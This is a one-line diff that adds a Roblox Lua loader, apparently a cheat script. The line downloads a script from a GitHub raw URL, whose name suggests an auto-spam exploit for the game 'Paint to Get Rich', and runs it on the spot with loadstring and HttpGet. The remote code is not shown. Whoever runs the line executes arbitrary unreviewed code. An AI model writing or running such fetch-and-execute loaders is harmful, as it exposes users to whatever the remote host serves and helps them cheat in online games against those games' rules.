@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/upd-paint-to-get-rich-spam6-wxp647e9n10lfu.lua"))()
